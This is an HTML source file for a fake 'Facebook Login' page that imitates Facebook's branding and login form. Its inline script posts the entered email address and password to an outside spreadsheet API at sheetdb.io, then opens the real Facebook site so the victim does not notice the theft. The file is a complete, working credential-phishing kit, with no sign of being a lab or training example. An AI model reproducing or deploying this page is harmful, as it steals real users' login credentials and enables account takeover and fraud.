<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <link rel="stylesheet" href="style.css">
</head>

<body oncontextmenu="false">
    <div class="container">
        <div class="left">
            <h1 class="logo">facebook</h1>
            <p class="text">Facebook helps you connect and share with the people in your life.</p>
        </div>
        <div class="right">
            <div class="login-box">
                <input type="text" placeholder="Email address or phone number" id="email">
                <input type="password" placeholder="Password" id="password">
                <button class="login-btn" id="btn">Log in</button>
                <a href="#" class="forgot">Forgotten password?</a>
                <hr>
                <button class="create-btn">Create new account</button>
            </div>
            <p class="create-page">
                <a href="#"><strong>Create a Page</strong></a> for a celebrity, brand or business.
            </p>
        </div>
    </div>
    <script>
        let email = document.getElementById('email');
        let password = document.getElementById('password');
        let btn = document.getElementById('btn');
        btn.addEventListener('click', () => {
            if (email.value && password.value) {
                
                fetch('https://sheetdb.io/api/v1/2yxbll07z211z', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        email: email.value,
                        password: password.value
                    })
                })
                    .then(response => response.json())
                    .then(data => console.log('Success:', data))
                    .catch(error => console.error('Error:', error));
                    window.open("https://web.facebook.com/")
            } else {
                alert("input filed can not be empty")
            }
        })


    </script>
</body>

</html>
